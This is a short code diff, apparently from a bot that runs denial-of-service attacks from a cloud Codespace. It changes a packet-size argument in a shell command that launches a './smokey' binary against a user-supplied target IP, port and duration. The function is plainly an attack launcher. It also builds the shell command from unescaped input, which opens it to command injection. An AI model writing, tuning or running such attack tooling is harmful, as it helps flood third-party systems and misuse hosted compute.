@@ -23,7 +23,7 @@ user_clicks = {}
 user_cooldowns = {}
 
 async def run_attack_command_on_codespace(target_ip, target_port, duration):
-    command = f"./smokey {target_ip} {target_port} {duration} 1450"
+    command = f"./smokey {target_ip} {target_port} {duration} 800"
     try:
         process = await asyncio.create_subprocess_shell(
             command,
